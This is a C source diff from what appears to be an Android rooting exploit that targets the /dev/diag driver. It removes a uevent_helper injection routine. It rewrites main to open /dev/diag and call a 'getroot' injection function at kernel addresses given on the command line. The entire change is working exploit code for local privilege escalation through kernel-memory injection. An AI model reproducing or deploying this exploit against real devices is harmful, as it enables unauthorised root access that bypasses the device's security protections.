@@ -34,6 +34,10 @@
 #include <jni.h>
 #include <sys/mman.h>
 #include <sys/system_properties.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <errno.h>
 
 #include "diag.h"
 
@@ -130,18 +134,6 @@ inject_getroot_command_with_fd(diag_injection_addresses *injection_addresses,
                                      fd) == 0;
 }
 
-static bool
-inject_uevent_helper(diag_injection_addresses *injection_addresses)
-{
-  struct values data[400];
-  int data_length;
-
-  data_length = prepare_injection_data(data, sizeof(data),
-                                       injection_addresses->uevent_helper_address);
-
-  return inject(data, data_length, injection_addresses->delayed_rsp_id_address) == 0;
-}
-
 jboolean
 Java_com_example_diaggetroot_MainActivity_getrootnative(JNIEnv *env,
                                                         jobject thiz,
@@ -164,6 +156,8 @@ usage()
 int
 main (int argc, char **argv)
 {
+  int fd;
+  int ret;
   diag_injection_addresses injection_addresses;
 
   if (argc != 3) {
@@ -176,7 +170,16 @@ main (int argc, char **argv)
     injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
   }
 
-  if (!inject_uevent_helper(&injection_addresses)) {
+  fd = open("/dev/diag", O_RDWR);
+  if (fd < 0) {
+    LOGE("failed to open /dev/diag dut to %s.", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+
+  ret = inject_getroot_command_with_fd(&injection_addresses, fd);
+  close(fd);
+
+  if (!ret) {
     exit(EXIT_FAILURE);
   }
 
